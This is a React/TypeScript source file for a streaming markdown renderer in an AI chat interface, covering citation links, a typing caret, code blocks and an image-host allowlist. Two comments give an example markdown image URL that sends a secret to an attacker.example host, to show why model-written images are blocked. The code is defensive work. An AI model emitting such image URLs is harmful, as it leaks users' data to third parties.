'use client';

import { createContext, memo, useContext, useMemo, type ReactNode } from 'react';
import ReactMarkdown, { type Components } from 'react-markdown';
import remarkGfm from 'remark-gfm';
import remend from 'remend';
import { ImageIcon } from './lib/icons';
import { getImagePolicy, isAllowedImage } from './lib/images';
import { CodeLines, CopyButton } from './lib/primitives';
import { cn } from './lib/utils';

/* Minimal structural syntax-tree types, so the plugins need no @types packages. */
interface TreeNode {
  type: string;
  value?: string;
  tagName?: string;
  url?: string;
  properties?: Record<string, unknown>;
  data?: { hProperties?: Record<string, unknown> };
  children?: TreeNode[];
}

/** remark plugin: turn `[1]`-style markers in text into citation links (`#source-1`). */
function remarkCitations(options: { idPrefix: string; count: number }) {
  return (tree: TreeNode) => {
    const visit = (node: TreeNode) => {
      if (!node.children || node.type === 'link' || node.type === 'linkReference') return;
      const next: TreeNode[] = [];
      for (const child of node.children) {
        if (child.type !== 'text' || !child.value || !/\[\d{1,3}\]/.test(child.value)) {
          visit(child);
          next.push(child);
          continue;
        }
        const re = /\[(\d{1,3})\]/g;
        let last = 0;
        let match: RegExpExecArray | null;
        while ((match = re.exec(child.value))) {
          const n = Number(match[1]);
          if (n < 1 || n > options.count) continue;
          if (match.index > last) next.push({ type: 'text', value: child.value.slice(last, match.index) });
          next.push({
            type: 'link',
            url: `#${options.idPrefix}-${n}`,
            data: { hProperties: { dataCitation: String(n) } },
            children: [{ type: 'text', value: String(n) }],
          });
          last = match.index + match[0].length;
        }
        if (last < child.value.length) next.push({ type: 'text', value: child.value.slice(last) });
      }
      node.children = next;
    };
    visit(tree);
  };
}

/** HTML void elements: hast gives them an empty `children` array, but React throws if they get any. */
const VOID_ELEMENTS = new Set([
  'area',
  'base',
  'br',
  'col',
  'embed',
  'hr',
  'img',
  'input',
  'link',
  'meta',
  'source',
  'track',
  'wbr',
]);

/** rehype plugin: append a caret element after the last rendered text while streaming. */
function rehypeCaret() {
  return (tree: TreeNode) => {
    let node: TreeNode = tree;
    for (;;) {
      const last = node.children?.at(-1);
      // Never descend into void elements (a trailing `---` or image): the caret goes after them instead.
      if (
        last &&
        last.type === 'element' &&
        last.children &&
        last.tagName !== 'pre' &&
        !VOID_ELEMENTS.has(last.tagName ?? '')
      )
        node = last;
      else if (last && last.type === 'text' && last.value?.trim() === '' && node.children!.length > 1) {
        // Skip trailing whitespace text nodes between block elements.
        node.children = node.children!.slice(0, -1);
      } else break;
    }
    node.children ??= [];
    node.children.push({ type: 'element', tagName: 'span', properties: { dataAuiCaret: '' }, children: [] });
  };
}

/**
 * rehype plugin: mark images inside links (a badge: `[![CI](badge.svg)](ci-url)`). An image that
 * does not load renders as a link of its own, and a link inside a link is invalid HTML: the browser
 * splits it, which breaks hydration. Marking the tree, rather than relying on our `a` renderer,
 * keeps this working when `components.a` is overridden.
 */
function rehypeImagesInLinks() {
  return (tree: TreeNode) => {
    const visit = (node: TreeNode, inLink: boolean) => {
      for (const child of node.children ?? []) {
        if (child.type !== 'element') continue;
        if (inLink && child.tagName === 'img') child.properties = { ...child.properties, dataAuiInLink: '' };
        visit(child, inLink || child.tagName === 'a');
      }
    };
    visit(tree, false);
  };
}

const REHYPE_PLUGINS = [rehypeImagesInLinks];
const REHYPE_PLUGINS_STREAMING = [rehypeImagesInLinks, rehypeCaret];

function textOf(node: ReactNode): string {
  if (typeof node === 'string' || typeof node === 'number') return String(node);
  if (Array.isArray(node)) return node.map(textOf).join('');
  if (node && typeof node === 'object' && 'props' in node) {
    return textOf((node.props as { children?: ReactNode }).children);
  }
  return '';
}

function CodeBlock({ children }: { children?: ReactNode }) {
  const child = Array.isArray(children) ? children[0] : children;
  const className =
    child && typeof child === 'object' && 'props' in child
      ? ((child.props as { className?: string }).className ?? '')
      : '';
  const language = /language-([\w-]+)/.exec(className)?.[1] ?? 'text';
  const code = textOf(children).replace(/\n$/, '');
  return (
    <div className="group/code border-aui-border bg-aui-bg/70 relative my-3 overflow-hidden rounded-lg border">
      <div className="border-aui-border flex items-center justify-between border-b px-3 py-1">
        <span className="font-aui-mono text-aui-fg-subtle text-[11px]">{language === 'text' ? 'code' : language}</span>
        <CopyButton text={code} label="Copy code" />
      </div>
      <pre className="font-aui-mono text-aui-fg overflow-x-auto px-3 py-2.5 text-[12.5px] leading-relaxed">
        <CodeLines code={code} language={normalizeLanguage(language)} />
      </pre>
    </div>
  );
}

/** Where images may load from (see `MarkdownProps.allowedImageHosts`). */
const ImagePolicyContext = createContext(getImagePolicy(undefined));

const linkClass =
  'text-aui-accent-fg decoration-aui-accent/40 hover:decoration-aui-accent focus-visible:outline-aui-ring font-medium underline underline-offset-2 transition-colors focus-visible:outline-2 focus-visible:outline-offset-1';

/**
 * Images load only from allowed hosts: fetching a URL the model wrote can leak data to a third
 * party (`![](https://attacker.example/p.png?d=secret)`). Other images render as a link instead, or as
 * plain text inside the link they already belong to.
 */
function MarkdownImage({
  src,
  alt,
  title,
  inLink,
}: {
  src: string;
  alt?: string | undefined;
  title?: string | undefined;
  /** The image is the content of a link, so its fallback must not be a link too. */
  inLink: boolean;
}) {
  const policy = useContext(ImagePolicyContext);
  // Unsafe protocols, and images that are still streaming, arrive with an empty URL.
  if (!src) return alt ? <>{alt}</> : null;
  if (isAllowedImage(src, policy)) {
    return <img src={src} alt={alt ?? ''} title={title} className="my-2 inline-block max-w-full rounded-lg" />;
  }
  const label = (
    <>
      <ImageIcon size={13} className="shrink-0 self-center" />
      <span className="sr-only">Image:</span> {alt || 'image'}
    </>
  );
  if (inLink) {
    return (
      <span title={title} className="inline-flex items-baseline gap-1">
        {label}
      </span>
    );
  }
  const external = /^https?:\/\//.test(src);
  return (
    <a
      href={src}
      title={title}
      className={cn(linkClass, 'inline-flex items-baseline gap-1')}
      {...(external ? { target: '_blank', rel: 'noopener noreferrer' } : {})}
    >
      {label}
    </a>
  );
}

function normalizeLanguage(lang: string) {
  const map: Record<string, string> = {
    typescript: 'ts',
    javascript: 'js',
    bash: 'sh',
    shell: 'sh',
    zsh: 'sh',
    python: 'py',
    yml: 'yaml',
  };
  return map[lang] ?? lang;
}

const components: Components = {
  p: ({ node: _node, className, ...props }) => (
    <p className={cn('my-2.5 first:mt-0 last:mb-0', className)} {...props} />
  ),
  h1: ({ node: _node, className, children, ...props }) => (
    <h1 className={cn('text-aui-fg mt-5 mb-2 text-lg font-semibold tracking-tight first:mt-0', className)} {...props}>
      {children}
    </h1>
  ),
  h2: ({ node: _node, className, children, ...props }) => (
    <h2 className={cn('text-aui-fg mt-5 mb-2 text-base font-semibold tracking-tight first:mt-0', className)} {...props}>
      {children}
    </h2>
  ),
  h3: ({ node: _node, className, children, ...props }) => (
    <h3 className={cn('text-aui-fg mt-4 mb-1.5 text-[15px] font-semibold first:mt-0', className)} {...props}>
      {children}
    </h3>
  ),
  h4: ({ node: _node, className, children, ...props }) => (
    <h4 className={cn('text-aui-fg mt-3 mb-1 text-sm font-semibold first:mt-0', className)} {...props}>
      {children}
    </h4>
  ),
  ul: ({ node: _node, className, ...props }) => (
    <ul className={cn('marker:text-aui-fg-subtle my-2.5 list-disc space-y-1 pl-5', className)} {...props} />
  ),
  ol: ({ node: _node, className, ...props }) => (
    <ol className={cn('marker:text-aui-fg-subtle my-2.5 list-decimal space-y-1 pl-5', className)} {...props} />
  ),
  li: ({ node: _node, className, ...props }) => <li className={cn('pl-1', className)} {...props} />,
  blockquote: ({ node: _node, className, ...props }) => (
    <blockquote
      className={cn('border-aui-border-strong text-aui-fg-muted my-3 border-l-2 pl-3', className)}
      {...props}
    />
  ),
  hr: ({ node: _node, className, ...props }) => <hr className={cn('border-aui-border my-4', className)} {...props} />,
  strong: ({ node: _node, className, ...props }) => (
    <strong className={cn('text-aui-fg font-semibold', className)} {...props} />
  ),
  a: ({ node: _node, className, href, children, ...props }) => {
    const citation = (props as Record<string, unknown>)['data-citation'];
    if (citation !== undefined) {
      return (
        <a
          href={href}
          className="bg-aui-accent/12 font-aui-mono text-aui-accent-fg hover:bg-aui-accent/25 focus-visible:outline-aui-ring mx-0.5 inline-flex h-4 min-w-4 -translate-y-px items-center justify-center rounded-[4px] px-1 align-middle text-[10px] font-semibold no-underline transition-colors focus-visible:outline-2 focus-visible:outline-offset-1"
          aria-label={`Source ${String(citation)}`}
        >
          {children}
        </a>
      );
    }
    const external = typeof href === 'string' && /^https?:\/\//.test(href);
    return (
      <a
        href={href}
        className={cn(linkClass, className)}
        {...(external ? { target: '_blank', rel: 'noopener noreferrer' } : {})}
        {...props}
      >
        {children}
      </a>
    );
  },
  code: ({ node: _node, className, ...props }) => (
    <code
      className={cn(
        className?.includes('language-')
          ? className
          : 'border-aui-border bg-aui-surface-2 font-aui-mono text-aui-fg rounded-[5px] border px-1 py-px text-[0.86em]',
      )}
      {...props}
    />
  ),
  pre: ({ children }) => <CodeBlock>{children}</CodeBlock>,
  img: ({ node: _node, src, alt, title, ...props }) => (
    <MarkdownImage
      src={typeof src === 'string' ? src : ''}
      alt={alt}
      title={title}
      inLink={(props as Record<string, unknown>)['data-aui-in-link'] !== undefined}
    />
  ),
  table: ({ node: _node, className, ...props }) => (
    <div className="border-aui-border my-3 overflow-x-auto rounded-lg border">
      <table className={cn('w-full text-left text-[13px]', className)} {...props} />
    </div>
  ),
  th: ({ node: _node, className, ...props }) => (
    <th
      className={cn('border-aui-border bg-aui-surface-2 text-aui-fg border-b px-3 py-1.5 font-semibold', className)}
      {...props}
    />
  ),
  td: ({ node: _node, className, ...props }) => (
    <td className={cn('border-aui-border/60 text-aui-fg-muted border-b px-3 py-1.5', className)} {...props} />
  ),
  span: ({ node: _node, ...props }) =>
    (props as Record<string, unknown>)['data-aui-caret'] !== undefined ? (
      <span
        aria-hidden="true"
        className="bg-aui-accent motion-safe:animate-aui-blink ml-0.5 inline-block h-[1.1em] w-[0.5ch] translate-y-[0.2em] rounded-[1px]"
      />
    ) : (
      <span {...props} />
    ),
};

export interface MarkdownProps {
  children: string;
  /** Repairs unterminated syntax and shows a caret while text is still arriving. */
  streaming?: boolean;
  /** Number of available sources; `[n]` markers up to this count become citation links. */
  citations?: number;
  /** Must match the `idPrefix` of the `Sources` the citations point to. Default "source". */
  citationPrefix?: string;
  /**
   * Where images may load from. Default: nowhere. The browser fetches an image as soon as it
   * renders, so a URL in model output can leak data (`![](https://attacker.example/p.png?d=…)`);
   * a blocked image renders as a link with its alt text, and nothing is requested.
   *
   * - A host name of http(s) URLs, matched exactly: `'images.example.com'` (any port), or
   *   `'localhost:3000'` (that port only).
   * - `'self'`: relative URLs (`/logo.png`, `./chart.png`), which load from your own origin.
   *   `//host/x` is not relative. An absolute URL to your own site needs its host listed.
   * - `'*'`: every image.
   *
   * Compared by value, so an inline array does not re-render the markdown.
   */
  allowedImageHosts?: readonly string[] | undefined;
  /** Element overrides, merged over the defaults. Keep the object stable: a new one re-renders the markdown. */
  components?: Components;
  className?: string;
}

const sameList = (a: readonly string[] | undefined, b: readonly string[] | undefined) =>
  a === b || (!!a && !!b && a.length === b.length && a.every((item, i) => item === b[i]));

/** Shallow, except that `allowedImageHosts` compares by value (it is often written inline). */
function sameProps(prev: MarkdownProps, next: MarkdownProps) {
  const keys = new Set([...Object.keys(prev), ...Object.keys(next)]) as Set<keyof MarkdownProps>;
  for (const key of keys) {
    if (key === 'allowedImageHosts' ? !sameList(prev[key], next[key]) : !Object.is(prev[key], next[key])) return false;
  }
  return true;
}

/**
 * Streaming-safe markdown (GFM). While `streaming`, unterminated emphasis, code
 * and links are closed before parsing so partial output never flashes raw syntax.
 * Raw HTML is not rendered, links and images with unsafe protocols (`javascript:`,
 * `data:`) are stripped, and images load only from `allowedImageHosts`.
 */
export const Markdown = memo(function Markdown({
  children,
  streaming = false,
  citations = 0,
  citationPrefix = 'source',
  allowedImageHosts,
  components: overrides,
  className,
}: MarkdownProps) {
  const text = useMemo(
    () => (streaming ? remend(children, { linkMode: 'text-only' }) : children),
    [children, streaming],
  );
  const remarkPlugins = useMemo(
    () =>
      citations > 0
        ? [remarkGfm, [remarkCitations, { idPrefix: citationPrefix, count: citations }] as const]
        : [remarkGfm],
    [citations, citationPrefix],
  );
  const merged = useMemo(() => (overrides ? { ...components, ...overrides } : components), [overrides]);
  const imagePolicy = useMemo(() => getImagePolicy(allowedImageHosts), [allowedImageHosts]);
  return (
    <div
      data-aui
      data-slot="markdown"
      className={cn('font-aui-sans text-aui-fg text-[14.5px] leading-[1.7] [overflow-wrap:anywhere]', className)}
    >
      <ImagePolicyContext value={imagePolicy}>
        <ReactMarkdown
          // Plugin tuples are typed loosely by unified; the shapes above are correct.
          remarkPlugins={remarkPlugins as never}
          rehypePlugins={(streaming ? REHYPE_PLUGINS_STREAMING : REHYPE_PLUGINS) as never}
          components={merged}
        >
          {text}
        </ReactMarkdown>
      </ImagePolicyContext>
    </div>
  );
}, sameProps);
